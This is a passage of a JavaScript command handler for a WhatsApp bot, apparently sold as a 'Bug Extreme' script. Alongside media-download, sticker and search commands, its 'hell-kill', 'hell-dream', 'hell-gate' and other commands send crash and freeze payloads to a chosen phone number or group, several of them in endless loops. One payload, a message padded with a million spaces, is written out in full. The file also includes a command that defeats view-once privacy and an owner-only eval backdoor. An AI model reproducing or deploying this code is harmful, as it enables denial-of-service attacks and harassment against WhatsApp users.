  if (!text) return replyme(`hai, apa yang ingin saya bantu?`)
async function openai(text, logic) { 
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  
            "tokenLimit": 8000,  
            "completionTokenLimit": 5000,  
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let pei = await openai(text, "")
replyme(pei)
}
break

case 'ytmp3': {
				if (!text) return replyme(`*wrong usage!*\n\nexample:\n${prefix + command} link`)
				if (!text.match('youtu')) return replyme('your link is wrong!')
				await arrayxd.sendMessage(m.chat, {
					react: {
						text: "👌",
						key: m.key,
					}
				})
				YouTubeMp3(args[0], args[1])
			}
			break
case 'ytmp4': {
				if (!text) return replyme(`*wrong usage!*\n\nexample:\n${prefix + command} link`)
				if (!text.match('youtu')) return replyme('link not detected')
				await arrayxd.sendMessage(m.chat, {
					react: {
						text: "👌",
						key: m.key,
					}
				})
				YouTubeMp4(args[0], args[1])
			}
			break
			
case "play": {
if (!text) return replyme(example("sad song"))
await arrayxd.sendMessage(m.chat, {react: {text: '🔍', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await arrayxd.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return replyme("Error! Result Not Found")
}
await arrayxd.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

case 'pinterest': case 'pin': {
  if (!text) return replyme(`Enter Query`);
  //try {
  await m.reply('please wait...');

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: arrayxd.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res);
  let ult = res.splice(0, 5);
  let i = 1;

  for (let pus of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: text
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Result.',
        hasMediaAttachment: true,
        imageMessage: await createImage(pus)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: []
})
    });
  }

  const msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hei\nBelow are the results of your search.'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `ArrayXD`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await arrayxd.relayMessage(m.chat, msg.message, {
    messageId: msg.key.id
  });
  
}
break

case 'sc':
case 'script': {
let buy = `*乂 Script Bot Array7 : 30K*
*乂 Feature? :*
*乂 No Enc, No Error, Bug Extreme, Pairing Code, And More*
*乂 Buy? :* wa.me/6289676226170
*乂 Or :* t.me/arrayxd
`
arrayxd.sendMessage(from, { video: { url: `https://files.catbox.moe/s6lfx5.mp4` },
caption: buy,
gifPlayback: true,
}, { quoted: m });
}
break

case 'owner': case 'creator': {
await arrayxd.sendContact(m.chat, author.map( i => i.split("@")[0]), m)
await arrayxd.sendMessage(m.chat, {text: `*My Owner*`}, {quoted: m})
}
break

case 'tt':
case 'tiktok':
case 'tiktokmp4':{
if (!text) return replyme( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replyme(`Invalid Link!`)
await replyme(`please wait...`)
require('./lib/scrape/tiktok').Tiktok(q).then( data => {
arrayxd.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })
})
}
break

case "instagramdownload":
case "igdl":{
if (!text) return replyme("there is no instagram link");
const regex = /^(?:https?:\/\/)?(?:www\.)?instagram\.com\/(?:p|tv|reel)\/([^\/?#&]+)/i;
if (regex.test(text)) {
const { data } = await axios.post("https://allvideodownloader.cc/wp-json/aio-dl/video-data/",{url: text});
let urls = data.medias.map(item => item.url);
const totalCount = urls.length;
if (totalCount > 0) {
for (let i = 0; i < totalCount; i++) {
await arrayxd.sendFile(m.chat, urls[i], 'file', `${i + 1}/${totalCount}`, m);
}
} else {
await replyme('error');
}
} else {
await replyme('there is no instagram link');
}}
break;

case 'wm': {
let teks = `${text}`
try {
 if (!quoted) return replyme(`Reply to Video/Image With Caption ${prefix + command}`)
 replyme(`please wait...`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await arrayxd.sendImageAsSticker(from, media, m, { packname: `${teks}`, author: developerName })
await fs.unlinkSync(encmedia)
}
} catch (e) {
replyme(`there is an error`)
}
}
break

case 'brat': {
    const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
    if (!quo) return replyme("Input Text");

    async function brat(text) {
        try {
            return await new Promise((resolve, reject) => {
                if (!text) return reject("Missing text input");
                axios.get("https://brat.caliphdev.com/api/brat", {
                    params: {
                        text
                    },
                    responseType: "arraybuffer"
                }).then(res => {
                    const image = Buffer.from(res.data);
                    if (image.length <= 10240) return reject("Failed to generate brat");
                    return resolve({
                        success: true,
                        image
                    });
                });
            });
        } catch (e) {
            return {
                success: false,
                errors: e
            };
        }
    }

    try {
        const buf = await brat(quo);
        if (!buf.success) throw new Error(buf.errors || "Failed");
        await arrayxd.sendImageAsSticker(m.chat, buf.image, m, { packname: "Array7", author: "ArrayXD" });
    } catch (error) {
        console.error(error);
        arrayxd.sendMessage(m.chat, { text: '*An Error Occurred*' }, { quoted: m });
    }
}
break

case "qc": {
if (!text) return replyme(example('text'))
let warna = ["#000000", "#ffffff"]
let reswarna = await warna[Math.floor(Math.random()*warna.length)]

const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": reswarna,
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = makeid+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return replyme("Error")
await arrayxd.sendImageAsSticker(m.chat, tempnya, m, {packname: developerName})
fs.unlinkSync(`./${tempnya}`)
})
})
}
break

case 'sticker':
case 'stiker':
case 's':{
if (!quoted) return replyme(`Reply to Video/Image With Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await arrayxd.sendImageAsSticker(m?.chat, media, m, {
packname: `Array7`,
author: developerName
})
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyme('Maximum 10 seconds!')
let media = await quoted.download()
let encmedia = await arrayxd.sendVideoAsSticker(m?.chat, media, m, {
packname: `Array7`,
author: developerName
})
await fs.unlinkSync(encmedia)
} else {
return replyme(`Send Image/Video With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
}
}
break

case 'get': {
if (!/^https?:\/\//.test(text)) return replyme('Prefix *URL* with http:// or https://')
let linknyaurl = await shorturl(text)
let _url = new URL(text)
let url = `${_url.origin}${_url.pathname}${_url.search}`;
let res = await fetch(url)
if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
delete res
replyme(`Content-Length: ${res.headers.get('content-length')}`)
}
if (!/text|json/.test(res.headers.get('content-type'))) return arrayxd.sendFile(m?.chat, url, 'file', `*Link:* ${linknyaurl}\n\n© ArrayXD`, m)
let txt = await res.buffer()
try {
txt = util.format(JSON.parse(txt + ''))
} catch (e) {
txt = txt + ''
} finally {
replyme(txt.slice(0, 65536) + '')
}
}
break

case 'hd':
case 'remini':{
if (!quoted) return replyme(`Reply to Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replyme("only supports images")
let media = await quoted.download()
const This = await remini(media, "enhance");
arrayxd.sendFile(m?.chat, This, "", "Done", m);
}
break

case 'clearbug': {
if (!isAcces) return replyme('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
if (!q) return replyme(`Usage: ${prefix + command} 628×××`)
let target = text.split(",")[0].trim() + '@s.whatsapp.net';
for (let i = 0; i < 3; i++) {
await arrayxd.sendMessage(target, {text: "*ArrayXD*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n*ArrayXD*",
});
}
replyme("Done clear bug");
}
break

case 'rvo': case 'readviewonce': {
if (!m.quoted) return replyme('reply the image/video you want to see')
if (m.quoted.mtype !== 'viewOnceMessageV2') return replyme('This is not a view-once message.')
let msg = m.quoted.message
let type = Object.keys(msg)[0]
const { downloadContentFromMessage } = require('@whiskeysockets/baileys')
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
return arrayxd.sendFile(m?.chat, buffer, 'media.mp4', msg[type].caption || '', m)
} else if (/image/.test(type)) {
return arrayxd.sendFile(m?.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}
break

case 'trackip': {
    if (!text) return replyme('Enter the IP you want to track!');
    try {
        let axios = require('axios');
        let ip = text.trim(); 
        let url = `https://ip-api.com/json/${ip}`; 
        
        axios.get(url).then(({ data }) => {
            if (data.status !== 'success') return replyme('Invalid or not found IP.');
            
            let hasil = `*IP Information:*\n` +
                        `- IP: ${data.query}\n` +
                        `- Country: ${data.country} (${data.countryCode})\n` +
                        `- Region: ${data.regionName}\n` +
                        `- City: ${data.city}\n` +
                        `- Time Zone: ${data.timezone}\n` +
                        `- ISP: ${data.isp}\n` +
                        `- Coordinate: ${data.lat}, ${data.lon}`;
            
            replyme(hasil);
        }).catch((err) => {
            console.error(err);
            replyme('An error occurred while tracking IP.');
        });
    } catch (err) {
        console.error(err);
        replyme('An internal error occurred.');
    }
}
break

case 'eval': {
if (!isAcces) return replyme('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
if (!m.quoted) return replyme(`*Reply to the quoted message to be retrieved*`);
let penis = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2);
let jeneng = `MessageData_${kripto.randomBytes(8).toString('hex')}.json`;
await fs.writeFileSync(jeneng, penis);
await replyme(penis);
await arrayxd.sendMessage(from, { document: { url: `./${jeneng}` }, fileName: jeneng, mimetype: '*/*' }, { quoted: m });
await fs.unlinkSync(jeneng);
}
break

case "public": {
if (!isBot) return replyme('𝗢𝗻𝗹𝘆 𝗕𝗼𝘁')
arrayxd.public = true
replyme('*Success Changes To Public*');
}
break

case "self": {
if (!isBot) return replyme('𝗢𝗻𝗹𝘆 𝗕𝗼𝘁')
arrayxd.public = false
replyme('*Success Changes To Self*');
}
break

case "addaccess": {
if (!isBot) return replyme(`𝗢𝗻𝗹𝘆 𝗕𝗼𝘁`)
if (!args[0]) return replyme(`Usage: ${prefix + command} number\nExample ${prefix + command} 628×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await arrayxd.onWhatsApp(bnnd)
if (ceknye.length == 0) return replyme(`Enter a Valid and Registered Number on WhatsApp !!!`)
kontributor.push(bnnd)
fs.writeFileSync('./message/lib/database/owner.json', JSON.stringify(kontributor))
replyme(`Nomor ${bnnd} Telah Di Acces !!!`);
}
break

case "dellaccess": {
if (!isBot) return replyme(`𝗢𝗻𝗹𝘆 𝗕𝗼𝘁`)
if (!args[0]) return replyme(`Usage: ${prefix + command} number\nExample ${prefix + command} 628×××`)
target = q.split("|")[0].replace(/[^0-9]/g, '')
unp = kontributor.indexOf(ya)
kontributor.splice(unp, 1)
fs.writeFileSync('./message/lib/database/owner.json', JSON.stringify(kontributor))
replyme(`Nomor ${target} Telah Di Hapus Acces !!!`);
}
break

case 'hell-kill': {
if (!isAcces) return replyme('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
if (!q) return replyme(`Usage: ${prefix + command} 628×××`)
let target = text.split(",")[0].trim() + '@s.whatsapp.net';
let DoneBug = `𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚
Target = ${target}

𝗡𝗢𝗧𝗘
> PLEASE pause for 5 minutes to avoid being spammed`
await arrayxd.sendMessage(from, { video: { url: `https://files.catbox.moe/s6lfx5.mp4` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
{
await newvirpen(target)
await freezekamoflase(target)
await newfreezebug(target)
await VPen(target, wanted)
await ArrayNew(target);
await ArrayNew(target);
await ArrayCarousel(target, Ptcp = true);
await ArrayCarousel(target, Ptcp = true);
await ArrayCarousel(target, Ptcp = true);
await ArrayCarousel(target, Ptcp = true);
await StuckNull(target, wanted)
await ClPmNull(target, wanted)
await liveLokFreeze(target, wanted)
await BlankInvite(target, wanted)
await documentfreeze(target, wanted)
await locasifreeze(target, wanted)
await liveLokFreeze(target, wanted)
await uidoc2(target, wanted)
await BlankInvite(target, wanted)
await documentfreeze2(target, wanted)
await IosPayM(target, wanted)
await IosStanza(target, wanted)
await IosCL(target, wanted)
await newcall(target)
await newcall2(target)
await newcall3(target)
await newcall4(target)
}
}
break

case 'hell-dream': {
if (!isAcces) return replyme('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
if (!q) return replyme(`Usage: ${prefix + command} 628×××`)
let target = text.split(",")[0].trim() + '@s.whatsapp.net';
let DoneBug = `𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚
Target = ${target}

𝗡𝗢𝗧𝗘
> PLEASE pause for 5 minutes to avoid being spammed`
await arrayxd.sendMessage(from, { video: { url: `https://files.catbox.moe/s6lfx5.mp4` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
for (let i = 0; ; i++) {
await newvirpen(target)
await freezekamoflase(target)
await newfreezebug(target)
await VPen(target, wanted)
await ArrayNew(target);
await ArrayNew(target);
await ArrayNew(target);
await ArrayCarousel(target, Ptcp = true);
await ArrayCarousel(target, Ptcp = true);
await ArrayCarousel(target, Ptcp = true);
await ArrayCarousel(target, Ptcp = true);
await StuckNull(target, wanted)
await ClPmNull(target, wanted)
await liveLokFreeze(target, wanted)
await BlankInvite(target, wanted)
await documentfreeze(target, wanted)
await locasifreeze(target, wanted)
await liveLokFreeze(target, wanted)
await uidoc2(target, wanted)
await BlankInvite(target, wanted)
await documentfreeze2(target, wanted)
await IosPayM(target, wanted)
await IosStanza(target, wanted)
await IosCL(target, wanted)
await newcall(target)
await newcall2(target)
await newcall3(target)
await newcall4(target)
}
}
break

case 'hell-execute': {
if (!isAcces) return replyme('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
if (!q) return replyme(`Usage: ${prefix + command} 628×××`)
let target = text.split(",")[0].trim() + '@s.whatsapp.net';
let DoneBug = `𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚
Target = ${target}

𝗡𝗢𝗧𝗘
> PLEASE pause for 5 minutes to avoid being spammed`
await arrayxd.sendMessage(from, { video: { url: `https://files.catbox.moe/s6lfx5.mp4` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
{
await newvirpen(target)
await freezekamoflase(target)
await newfreezebug(target)
await VPen(target, wanted)
await ArrayNew(target);
await ArrayNew(target);
await ArrayNew(target);
await ArrayNew(target);
await ArrayCarousel(target, Ptcp = true);
await ArrayCarousel(target, Ptcp = true);
await ArrayCarousel(target, Ptcp = true);
await ArrayCarousel(target, Ptcp = true);
await StuckNull(target, wanted)
await ClPmNull(target, wanted)
await liveLokFreeze(target, wanted)
await BlankInvite(target, wanted)
await documentfreeze(target, wanted)
await locasifreeze(target, wanted)
await liveLokFreeze(target, wanted)
await uidoc2(target, wanted)
await BlankInvite(target, wanted)
await documentfreeze2(target, wanted)
await IosPayM(target, wanted)
await IosStanza(target, wanted)
await IosCL(target, wanted)
await newcall(target)
await newcall2(target)
await newcall3(target)
await newcall4(target)
}
}
break

case 'hell-hatred': {
if (!isAcces) return replyme('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
if (!q) return replyme(`Usage: ${prefix + command} 628×××`)
let target = text.split(",")[0].trim() + '@s.whatsapp.net';
let DoneBug = `𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚
Target = ${target}

𝗡𝗢𝗧𝗘
> PLEASE pause for 5 minutes to avoid being spammed`
await arrayxd.sendMessage(from, { video: { url: `https://files.catbox.moe/s6lfx5.mp4` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
for (let i = 0; ; i++) {
await newvirpen(target)
await freezekamoflase(target)
await newfreezebug(target)
await VPen(target, wanted)
await ArrayNew(target);
await ArrayNew(target);
await ArrayNew(target);
await ArrayNew(target);
await ArrayNew(target);
await ArrayNew(target);
await ArrayCarousel(target, Ptcp = true);
await ArrayCarousel(target, Ptcp = true);
await ArrayCarousel(target, Ptcp = true);
await ArrayCarousel(target, Ptcp = true);
await StuckNull(target, wanted)
await ClPmNull(target, wanted)
await liveLokFreeze(target, wanted)
await BlankInvite(target, wanted)
await documentfreeze(target, wanted)
await locasifreeze(target, wanted)
await liveLokFreeze(target, wanted)
await uidoc2(target, wanted)
await BlankInvite(target, wanted)
await documentfreeze2(target, wanted)
await IosPayM(target, wanted)
await IosStanza(target, wanted)
await IosCL(target, wanted)
await newcall(target)
await newcall2(target)
await newcall3(target)
await newcall4(target)
}
}
break

case 'hell-this': {
if (!isBot) return replyme('𝗢𝗻𝗹𝘆 𝗕𝗼𝘁');
await reaction(m.chat, "😈");
for (let i = 0; ; i++) {
await newvirpen(m.chat)
await freezekamoflase(m.chat)
await newfreezebug(m.chat)
await VPen(m.chat, wanted)
await ArrayNew(m.chat);
await ArrayNew(m.chat);
await ArrayNew(m.chat);
await ArrayCarousel(m.chat, Ptcp = true);
await ArrayCarousel(m.chat, Ptcp = true);
await ArrayCarousel(m.chat, Ptcp = true);
await ArrayCarousel(m.chat, Ptcp = true);
await StuckNull(m.chat, wanted)
await ClPmNull(m.chat, wanted)
await liveLokFreeze(m.chat, wanted)
await BlankInvite(m.chat, wanted)
await documentfreeze(m.chat, wanted)
await locasifreeze(m.chat, wanted)
await liveLokFreeze(m.chat, wanted)
await uidoc2(m.chat, wanted)
await BlankInvite(m.chat, wanted)
await documentfreeze2(m.chat, wanted)
await IosPayM(m.chat, wanted)
await newcall(m.chat)
await newcall2(m.chat)
await newcall3(m.chat)
await newcall4(m.chat)
}
}
break

case 'hell-place': {
if (!isBot) return replyme('𝗢𝗻𝗹𝘆 𝗕𝗼𝘁')
await reaction(m.chat, "😈")
{
await newvirpen(m.chat)
await freezekamoflase(m.chat)
await newfreezebug(m.chat)
await VPen(m.chat, wanted)
await ArrayNew(m.chat);
await ArrayNew(m.chat);
await ArrayNew(m.chat);
await ArrayNew(m.chat);
await ArrayCarousel(m.chat, Ptcp = true);
await ArrayCarousel(m.chat, Ptcp = true);
await ArrayCarousel(m.chat, Ptcp = true);
await ArrayCarousel(m.chat, Ptcp = true);
await StuckNull(m.chat, wanted)
await ClPmNull(m.chat, wanted)
await liveLokFreeze(m.chat, wanted)
await BlankInvite(m.chat, wanted)
await documentfreeze(m.chat, wanted)
await locasifreeze(m.chat, wanted)
await liveLokFreeze(m.chat, wanted)
await uidoc2(m.chat, wanted)
await BlankInvite(m.chat, wanted)
await documentfreeze2(m.chat, wanted)
await IosPayM(m.chat, wanted)
await IosStanza(m.chat, wanted)
await IosCL(m.chat, wanted)
await newcall(m.chat)
await newcall2(m.chat)
await newcall3(m.chat)
await newcall4(m.chat)
}
}
break

case "hell-gate": {
if (!isAcces) return replyme('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
if (!q) return replyme(`Example: .${command} 120xxx@g.us|5`)
victim = q.split("|")[0]
amount = q.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
await replyme(`< ! > Sending Bug`)
for (let i = 0; i < amount; i++) {
var etc = generateWAMessageFromContent(from, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "YES IN"
    },
    "footer": {
      "text": "ArrayHere"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'Hell Crash', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: from, quoted: m })
await arrayxd.relayMessage(Pe, etc.message, { messageId: etc.key.id })
}
replyme('< ! > Succes')
break

default:
if (budy.startsWith('>')) {
if (!isAcces) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isAcces) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});